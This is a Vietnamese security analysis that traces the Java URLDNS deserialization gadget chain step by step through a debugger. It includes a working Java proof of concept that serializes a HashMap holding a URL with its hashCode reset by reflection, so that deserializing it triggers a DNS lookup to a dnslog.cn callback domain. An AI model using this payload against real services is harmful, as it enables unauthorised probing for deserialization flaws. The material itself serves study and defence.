## Cách hoạt động của chain.
```js
  HashMap.readObject()
    HashMap.hash()
      URL.hashCode()
        URLStreamHandler.hashCode()
          URLStreamHandler.getHostAddress()
            InetAddress.getByName()
```
- Gadget tồn tại trong rt.jar của java với mục đích là tạo dns lookup tới domain tuỳ ý. 
- Đặt breakpoint tại HashMap.readObject()
![Screenshot 2022-12-22 094522](https://i.imgur.com/xeJkpEQ.png)
- Vào chức năng debug
- Hàm main phân tích
```java
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.net.URL;

public class Main implements Serializable {

    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        HashMap<URL, String> hashMap = new HashMap<URL, String>();
        
        URL url= new URL("http://nx3344.dnslog.cn"); //dnslog
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, -1 );
        hashMap.put(url, "time");

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("url.bin"));
        oos.writeObject(hashMap);

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("url.bin"));
        ois.readObject();
    }
}
```

![Screenshot 2022-12-22 095021](https://i.imgur.com/5GyYYoW.png)
- Vào hàm hash() thì gọi tới hashCode()
![Screenshot 2022-12-22 095226](https://i.imgur.com/RSELUWD.png)
- Do để gọi tới URLStreamHandler.hashCode() cần set cho hashCode của URL = -1
![Screenshot 2022-12-22 095335](https://i.imgur.com/PfhejQ3.png)
- Tiếp tục vào trong URLStreamHandler.hashCode() 
![Screenshot 2022-12-22 095643](https://i.imgur.com/fFrVZr2.png)
- Method này gọi tới URLStreamHandler.getHostAddress() với URL object ban đầu.
- Với InetAddress.getByName() chính là method thực hiện resolve dns với domain ta truyền vào.

- Đây cũng được chính là sink của gadgetchain này.

![Screenshot 2022-12-22 095925](https://i.imgur.com/UDAPp6u.png)

# Reference
- https://sec.vnpt.vn/2020/02/co-gi-ben-trong-cac-gadgetchain/
- https://www.geeksforgeeks.org/reflection-in-java/?fbclid=IwAR101djrM59HEpJbVDddgTXPYmrCVQMQACFiRFUVsy8ANijS7DopIRqYfv8